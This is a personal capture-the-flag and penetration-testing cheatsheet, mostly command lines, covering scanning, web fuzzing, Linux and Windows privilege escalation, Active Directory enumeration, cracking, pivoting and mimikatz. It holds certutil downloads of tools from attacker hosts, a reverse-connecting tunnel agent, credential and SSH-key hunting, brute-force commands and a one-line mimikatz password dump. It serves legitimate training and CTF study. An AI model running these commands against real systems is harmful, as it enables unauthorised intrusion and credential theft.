# CTF Cheatsheet

1. [Enumeration and Exploitation](#enumeration-and-exploitation)
1. [Linux Privilege Escalation](#linux-privilege-escalation)
1. [Windows Privilege Escalation](#windows-privilege-escalation)
1. [Miscellaneous](#miscellaneous)

## Enumeration and Exploitation

+ Note: Enumeration is a CYCLIC process; all enumeration steps have to be tried whenever something is found, even if it seems similar or equivalent to a previous finding

+ Whenever enumerating at any stage (initial recon or privesc), check EVERY SINGLE THING till you find a clue/foothold; do NOT assume anything because assumptions would lead to missing the next vector (also check notes)

+ Scanning:

  Start with a TCP scan; if you do not get anything from footprinting the services found, then only go for a UDP scan since it is time-consuming.

  ```sh
  nmap -T4 -p- -A -Pn -v target.com
  # TCP scan

  sudo nmap -sU -Pn -v target.com
  # scan only top UDP ports, unless you have a lot of time to kill

  # we can also check with alt scanning tools like nikto
  nikto -h target.com

  # if we want to check on a network level
  netdiscover -r 10.0.2.0/24
  ```

+ Service [footprinting](https://github.com/SrivathsanNayak/ethical-hacking-notes/blob/main/HTBAcademy/Footprinting/README.md):

  Based on whatever ports & services are there; consider enumerating manually as well as using automated tools. Also, search for ALL found ports and services - it could be associated with a known vulnerable service/version. In very rare cases, if the box is faulty, try resetting it and re-doing the footprinting.

+ Clues:

  Look for certain clues and hints in the challenge statement itself. For example, if the word 'knock' is mentioned, it would refer to ```knock``` as in [port knocking](https://d00mfist.gitbooks.io/ctf/content/port_knocking.html), after which we will have to re-scan the machine.

+ Web enumeration:

  As with anything else, do not leave any stone unturned. Check everything, and do not assume anything. For any check, use multiple wordlists and multiple tools.

  For manual enumeration, always check the following at least:

  + 'Inspect' and 'View Page Source' - check all tabs in Inspect part, and source code thoroughly for any clues

  + Read the source code again, understand it as much as possible; check for any endpoints

  + Input fields - for any field which takes user input, test it with all possible payloads to check for all types of web attacks like SQLi, XSS, XXE, LFI, etc.

  + Login forms - same as above; check for all payloads imaginable, use multiple wordlists. Common attacks in login forms include SQLi, NoSQLi, null byte injection, etc; if needed, we can use tools such as ```sqlmap```

  + ```sqlmap``` - can be used on top of fuzzing and checking forms; if WAF is being used, we can use this with options like ```--no-cast```, ```--random-agent``` and ```--tamper``` options - refer [sqlmap cheatsheet](https://highon.coffee/blog/sqlmap-cheat-sheet/)

  + Command injection - for any input forms, check if command injection payloads work; in case of blind scenarios or when we are not able to see output, we can try by creating a file or fetching a page from attacker machine

  + Injection attacks - other types of injection attacks should also be checked in input forms, parameters, and wherever possible

  + Burp Suite - if going nowhere, take a tour of the webpages but with Intercept enabled; helpful for any redirects or hints

  + SSL certificate - in a few cases, viewing the certificate gives us extra information like usernames, email addresses, subdomains, etc.

  + File info - for any files encountered, check if it has any secret data or any other use; some files need to be checked by hexdump tools to view the magic numbers, or they might have embedded files.

  + Technologies used and their versions - this can lead us to known exploits; research extensively on platforms such as Google, ExploitDB and Metasploit.

  + Parameter fuzzing - various wordlists can be used for fuzzing parameters using tools like ```ffuf```; if we do not know a parameter is being used or not, we can still try fuzzing for it

  + Weak/default credentials - for any login page, make sure you try default or weak creds first before proceeding with any bruteforce attempt

  + Bruteforce - if you really need to use ```hydra``` to bruteforce basic authentication or login form, for example, then make sure you know the username(s) and for passwords you can use rockyou.txt; in case usernames are not given, choose a few common usernames or based on the challenge, and in addition to that generate a wordlist from the website using ```cewl```

    ```sh
    gobuster dir -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,html,bak,jpg,zip,bac,sh,png,md,jpeg,pl,ps1,aspx -t 25
    # directory scan - this is not recursive to save time
    # if any directories found, recursively scan those directories in another command

    # if recursive scanning is really required
    feroxbuster -u http://target.com -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,cgi,sh,pl,aspx,sql,xml --extract-links --scan-limit 2 --filter-status 400,401,404,405,500 --silent
    
    # use multiple wordlists - when checking again, start with smaller wordlists like 'common.txt' and then go for bigger ones like 'raft-large-*.txt' and 'megabeast.txt'
    # and if that does not give anything, use another tool like ffuf for directory scanning
    # additionally, scan directories which provide directory listing as well - things can be hidden from us

    ffuf -u https://target.com/folder/FUZZ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -s
    # directory scanning using ffuf

    ffuf -c -u "http://target.com" -H "Host: FUZZ.target.com" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -t 25 -fs 10005 -s
    # subdomain enumeration, filter false positives
    # similar to the above, always check with multiple wordlists and multiple tools

    gobuster vhost -u http://target.com -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
    # vhost enumeration

    sudo wfuzz -c -f sub-fighter -u "http://target.com" -H "Host: FUZZ.target.com" -w /usr/share/wordlists/seclists/Discovery/DNS/bitquark-subdomains-top100000.txt -t 50
    # alt tool for subdomain enum

    ffuf -w /usr/share/seclists/Fuzzing/UnixAttacks.fuzzdb.txt -u "http://target.com/index.php?referer=FUZZ" -fw 1680
    # parameter fuzzing

    wfuzz -u http://target.com/dashboard.php?FUZZ=ls+-la -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt --hw 0
    # parameter fuzzing can also check for RCE

    wfuzz -v -c -z file,/usr/share/wordlists/rockyou.txt -d "{"username":"admin","password":"FUZZ"}" --hw 42 http://target.com/api/login
    # web bruteforce using wfuzz - hydra can also be used
    ```

## Linux Privilege Escalation

  ```linpeas.sh``` is a good starting point - go through everything listed in its output. But in case you are not getting anything, manual checks will help:

  ```sh
  # refer Linux Privilege Escalation section in HTB academy

  id
  # check which groups you are part of - some groups have more permissions

  ls -la
  # search all files in home directory and go through them
  # tip - use the 'file' command to quickly check what type of file it is - if it is of use, we can transfer it to our machine

  ls -la /home
  # check all users
  # if possible go through their directories
  # we can have interesting folders like '.ssh' or '.mozilla'

  sudo -l
  # if we have password, check the commands we can run as root or other user/group
  # this command will also show if we have LD_PRELOAD set for example

  history
  # check previous commands

  uname -r

  cat /etc/lsb-release
  # based on kernel info and distro info, google for exploits associated
  # search for both attributes - exploits such as gameoverlayfs and dirty pipe are very common

  # if we have a web directory, enumerate it completely for any creds
  ls -la /var/www/

  find / -perm -222 -type d 2>/dev/null
  # search world-writable folders

  find / -type f -iname ".*" -ls 2>/dev/null
  # search all hidden files

  find / -type f -user joe 2>/dev/null
  # search files owned by 'joe'

  find / -group userGroup 2>/dev/null
  # search files owned by 'userGroup'

  find / -type f -perm -04000 -ls 2>/dev/null
  # find files that have SUID

  grep --color=auto -rnw -iIe "PASSW\|PASSWD\|PASSWORD\|PWD" --color=always 2>/dev/null
  # check password strings

  # for extended password hunting, check the PasswordAttacks module from HTB
  # it includes a section on finding creds

  # if the box is based on a web server or web app, look for stored passwords or hashes in the database
  # for example, a machine hosting Apache OfBiz will have Derby DB, and we should check for config, creds, etc.

  find / -perm -u=s -type f 2>/dev/null
  # check SUID binaries - for exploits, check GTFOBins

  find / -name authorized_keys 2>/dev/null
  find / -name id_rsa 2>/dev/null
  # check for SSH keys

  cat /etc/exports
  # check for 'no_root_squash'

  # in some cases, there are unknown or offbeat SUID binaries, they should be checked first
  # run those binaries and try to understand how it works
  # see how it responds to input, certain binaries can be exploited through buffer overflow, ret2libc, etc.
  # if required, transfer to attacker machine and reverse engineer with Ghidra - we can check function code, strings
  # we can also upload the binary to an online tool like Decompiler Explorer, and copy-paste the output code in ChatGPT for an overview

  ls -la /mnt
  # check if anything is mounted

  lsblk
  # list blocks

  # for any interesting binaries or anything with a name or version attached, research for known exploits
  # linpeas would not help here, so we need to manually check

  cat /etc/crontab
  # check scheduled jobs
  
  ./pspy64
  # check processes running in background using pspy

  # also, if any interesting programs are found, like Python or Bash scripts
  # try to understand how it works and if that can be exploited
  # using methods like library hijacking, tar wildcard injection

  ls -la /etc/update-motd.d/
  # check if we have any writable banner or MOTD files

  mysql -u root -p
  # enumerate internal services such as mysql
  # with known or common passwords

  env
  # check for specific env variables set
  # like env_keep+=LD_PRELOAD

  # if there is a script to be modified
  # and we do not have write access to script but write access to directory
  # we can create another evil script in same directory and create a symbolic link

  ss -ltnp
  # check internal services for open ports
  # if unusual ports are seen here, it could be checked further

  getcap -r / 2>/dev/null
  # check capabilities

  # check if the target box is a Docker image
  # so that we can break out of it
  hostname
  # random hostname

  ls -la /
  # includes .dockerenv

  cat /proc/1/cgroup
  # includes 'docker' in paths

  ifconfig
  # check machine IP; we can also run 'hostname -i'

  # if we are in a Docker env, we can check internal ports
  # using a primitive bash port-scanner to check internal services
  # we can also consider a ping-sweep to check for other machines in same network - for example
  for i in {1..255}; do (ping -c 1 172.18.0.${i} | grep "bytes from" &); done
  # this step should be considered only when no other privesc vectors have been identified on machine

  # example - if we have access to MySQL DB, we can inject PHP code into table
  # and save table to file on remote system - then we can get RCE using curl

  # if pivoting into other machines in same network is required
  # we can look into sshuttle and scanning other internal hosts using a ping sweep - check THM Holo room

  dpkg -l
  # list apps installed by 'dpkg'

  mount
  # list mounted filesystems

  lsmod
  # list loaded kernel modules

  /sbin/modinfo modulename
  # check info on any kernel module

  less /proc/1932/status
  # inspect process info of PID 1932
  ```

## Windows Privilege Escalation

  ```cmd
  # refer Windows Privilege Escalation section in HTB academy

  whoami
  # user

  whoami /priv
  # current user privileges

  whoami /groups

  net users
  # list users

  net user Administrator
  # list user details

  qwinsta
  # other users logged in

  net localgroup
  # users groups

  net localgroup Administrators
  # list group members

  systeminfo
  # verbose output

  systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
  # shows only required info

  hostname

  gci -force
  # show hidden directories in PS

  findstr /si password *.txt
  # recursively search all directories for 'password' string in text files

  # for extended password hunting, check the PasswordAttacks module from HTB
  # it includes a section on finding creds

  cmdkey /list
  # lists saved credentials

  runas /savecred /user:admin reverse_shell.exe
  # try credentials

  # registry keys can also contain passwords
  reg query HKLM /f password /t REG_SZ /s

  reg query "HKLM\SOFTWARE\Microsoft\Windows NT\Currentversion\Winlogon"
  # check for password reuse as well

  # if we have credentials for a user, test it
  evil-winrm -u "joe" -p "p@ssw0rd!" -i target.com

  # for port forwarding, we can use plink.exe

  wmic qfe get Caption,Description,HotfixID,InstalledOn
  # lists updates installed using wmic tool

  wmic logicaldisk get caption,description,providername
  # list drives

  where -R C:\Windows wsl.exe
  # search for windows subsystem for linux
  # you can also search for bash.exe

  ipconfig /all
  
  arp -a
  # check arp tables

  route print
  # check routing tables

  netstat -ano
  # lists listening ports on target system

  dir /a-r-d /s /b
  # find writable files, recursively

  dir /a-r-d /s /b | findstr /v "htb-student"
  # exclude certain keyword from directory search

  schtasks /query /fo LIST /v
  # lists scheduled tasks

  driverquery
  # installed drivers

  sc queryex type=service
  # service enum

  sc query windefend
  # check for Windows Defender

  netsh advfirewall firewall dump
  netsh firewall show state
  netsh firewall show config
  # firewall enumeration

  wmic product
  # prints info on product

  wmic product get name,version,vendor
  # filter output

  wmic service list brief
  # all services

  wmic service list brief | findstr "Running"
  # filter output

  sc qc service
  # prints info on service

  certutil.exe -urlcache -f http://attacker.com/winpeas.exe winpeas.exe
  # fetch file from attacker machine to target - like wget or curl

  # check for DLL hijacking vulns using ProcMon

  # check for unquoted service path vuln
  # requires permission to write to a folder on the path and to restart the service

  wmic service get name,displayname,pathname,startmode
  # check running services with unquoted paths

  sc qc unquotedsvc
  # check binary path of service

  .\accesschk64.exe /accepteula -uwdq "C:\Program Files\"
  
  # check privileges on folders in binary path and find a writable folder
  # after this, we can generate a payload using msfvenom
  # move payload to target in the correct path, setup listener, and restart service
  sc stop unquotedsvc

  sc start unquotedsvc
  
  # check Autoruns for any programs - the path will differ
  C:\Users\User\Desktop\Tools\Autoruns\Autoruns64.exe

  reg query HKLM\Software\Policies\Microsoft\Windows\Installer
  reg query HKCU\Software\Policies\Microsoft\Windows\Installer
  # check for AlwaysInstallElevated

  Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
  # check for exploits related to regsvc

  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
  # check for file permissions on executable files

  icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
  # check for Startup apps

  C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc
  # service permissions

  dir C:\
  # enumerate directories at top-level, check for subdirectories
  ```

  ```ps
  # enumerate in PS

  Get-LocalUser
  # list all users

  Get-LocalGroup
  # list all groups

  Get-LocalGroupMember Administrators
  # list members of a group

  systeminfo
  # check OS name, version, system type

  ipconfig /all
  # list all network interfaces

  route print
  # display routing table

  netstat -ano
  # list all active network connections

  Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  # list all 32-bit installed apps

  Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
  # list all 64-bit installed apps

  # the registry key queries may not be complete always
  # so we should always manually check directories like 'Program Files' and 'Downloads'

  Get-Process
  # list running processes

  # search for files with respect to apps enumerated earlier

  Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue
  # search for kdbx files

  Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue
  # search for configuration files of XAMPP

  Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue
  # search for documents and text files in user home directory

  # if we get creds for any user, check if it is a local user
  # also check for password re-use

  # if Transcription and Script Block Logging settings are enabled
  # in PowerShell, we can extract log info

  Get-History
  # commands executed previously

  (Get-PSReadlineOption).HistorySavePath
  # path of history file from PSReadline

  type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
  # this history file can contain previous commands

  # this file mentions 'Start-Transcript' with a filepath
  # PS Transcription logs the session till 'Stop-Transcript', so we can check this file

  type C:\Users\Public\Transcripts\transcript01.txt

  # to search for Script Block Logging events, search for event ID 4104
  ```

  ```cmd
  # Active Directory enum

  net user /domain
  # list all users

  net user joe.bloggs /domain
  # info for particular user

  net user Guest /domain
  # info for guest account

  net group /domain
  # list all groups

  net group "Admins" /domain
  # info for group

  net accounts /domain
  # enumerate password policy

  # we can enumerate AD using PowerShell as well
  # using cmdlets like Get-ADUser, Get-ADGroup, Get-ADObject and Get-ADDomain
  # or using tools such as Sharphound/Bloodhound

  # AD enum with PowerView
  Import-Module .\PowerView.ps1

  Get-NetDomain
  # basic info of domain

  Get-NetUser
  # list of all users in domain, with all attributes

  Get-NetUser | select cn
  # prints only 'cn' - username attribute - of all users

  Get-NetUser | select cn,pwdlastset,lastlogon
  # get username, timestamp for last password change, and last login

  Get-NetGroup | select cn
  # prints name of all groups

  Get-NetGroup "Sales Department" | select member
  # print members of group
  
  Get-NetComputer | select operatingsystem,dnshostname
  # list OS and hostnames

  Find-LocalAdminAccess
  # scans network to check if current user has admin permissions on any computer in domain

  Get-NetSession -ComputerName files04 -Verbose
  # check for any logged-in users

  Get-NetUser -SPN | select samaccountname,serviceprincipalname
  # check SPNs

  Get-ObjectAcl -Identity stephanie
  # enumerate user to check which ACEs are applied

  Convert-SidToName S-1-5-21-1987370270-658905905-1781884369-1104
  # convert SIDs to readable format

  Get-ObjectAcl -Identity "Management Department" | ? {$_.ActiveDirectoryRights -eq "GenericAll"} | select SecurityIdentifier,ActiveDirectoryRights
  # in certain group, check if any users have 'GenericAll' permissions
  # in general, look out for interesting perms like 'GenericAll', 'GenericWrite', 'AllExtendedRights', etc.

  Find-DomainShare -CheckShareAccess
  # finds shares on computers in domain, but takes time

  Invoke-ACLScanner -ResolveGUIDs

  Find-InterestingDomainAcl
  # check for interesting entries

  # do not forget AD attacks - mostly using impacket tools
  ```

## Miscellaneous

+ [Steganography](https://0xrick.github.io/lists/stego/):

  Whenever you come across any image files, given the context, you can always give steganography a try; if you happen to have a password/string, you can check with tools like ```steghide```. For other types of files, like audio files, we have stego tools like ```wavsteg``` and ```Sonic Visualizer```, so you should know which tool to try for which type of file:

  ```sh
  steghide extract -sf image.jpg

  foremost -i image.jpg

  strings -n 6 image.jpg

  stegseek image.jpg /usr/share/wordlists/rockyou.txt
  # check if it is using common passwords

  exiftool image.jpg

  binwalk --dd='.*' image.jpg

  zsteg -a test.png
  ```

+ Cryptography:

  For any text that you cannot understand or decode, it could be encoded/encrypted, and sometimes in multiple layers. Check with the following tools:

  + [CyberChef](https://gchq.github.io/CyberChef/) - check with all recipes

  + [dCode](https://www.dcode.fr/en) - can be used to identify cipher used; also browse for all tools as it contains a lot of esoteric languages

+ Bruteforce:

  ```hydra``` can be used for bruteforcing for multiple services (```nxc```/```NetExec``` as alternative bruteforce tools):

  ```sh
  hydra -l joe -P pwd.lst ssh://target.com

  hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt target.com ftp

  crunch 4 4 -t "s@@@" -o pwd.lst
  # if we have a known pattern of password

  cewl -d 5 -m 8 -e http://target.com -w wordlist.txt
  # generate wordlist from website
  # -d for spidering depth, and -m for minimum wordlength
  ```

+ Cracking tools:

  + ```ssh2john```:

    ```sh
    ssh2john id_rsa > hash_id_rsa

    john --wordlist=/usr/share/wordlists/rockyou.txt hash_id_rsa
    ```
  
  + ```zip2john```:

    ```sh
    zip2john backups.zip > ziphash.txt

    john --wordlist=/usr/share/wordlists/rockyou.txt ziphash.txt
    ```
  
  + ```gpg2john```:

    ```sh
    gpg2john private.asc > asc_hash

    john --wordlist=/usr/share/wordlists/rockyou.txt asc_hash
    ```
  
  + ```hashcat```:

    ```sh
    hashcat -a 0 -m 1600 apachehash.txt /usr/share/wordlists/rockyou.txt
    ```
  
+ Pivoting using ```ligolo-ng```:

  ```sh
  # on attacker
  sudo ip tuntap add user sv mode tun ligolo
  sudo ip link set ligolo up

  ~/Tools/ligolo-ng/proxy -selfcert
  # run the proxy
  ```

  ```cmd
  # suppose we have reverse shell on a Windows system - which has access to internal network
  # fetch the agent file for this target

  certutil -urlcache -f http://192.168.45.200:8000/ligolo-ng-windows/agent.exe agent.exe

  .\agent.exe -connect 192.168.45.200:11601 -ignore-cert
  # connect to attacker
  ```

  ```sh
  # on attacker
  # in ligolo shell, where we get the connection
  session
  # select the session

  ifconfig
  # verify IP info

  # in new tab, add routing info for internal network
  sudo ip route add 10.10.79.0/24 dev ligolo

  # in ligolo session, start tunneling
  start
  ```

  ```sh
  # in attacker, in ligolo session
  # we can create a listener
  # e.g. - for file transfer from attacker to another target on internal network
  listener_add --addr 0.0.0.0:1236 --to 0.0.0.0:8000

  listener_list
  # verify
  ```

  ```cmd
  # on target in internal facing network
  # we can use the pivot's IP & port as configured on ligolo listener
  certutil -urlcache -f http://10.10.150.147:1236/SweetPotato.exe  SweetPotato.exe
  ```

+ AD attacks - if policies allow, we can test multiple types of attacks in AD env:

  + password spraying using ```crackmapexec```, ```kerbrute```

  + AS-REP roasting using ```impacket-GetNPUsers```

  + kerberoasting using ```impacket-GetUserSPNs```

  + forging tickets with ```mimikatz```

  + DC sync attacks using ```mimikatz```, ```impacket-secretsdump```

  + creating shadow copies with ```vshadow```

+ mimikatz:

  + ensure you have local admin privilege for post-exploitation

  + test with latest version of the tool in case the standard binary does not work

  + in case of a non-interactive shell, we can run the binary in a single command without entering the mimikatz prompt - ```.\mimikatz.exe "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::sam" "exit"```
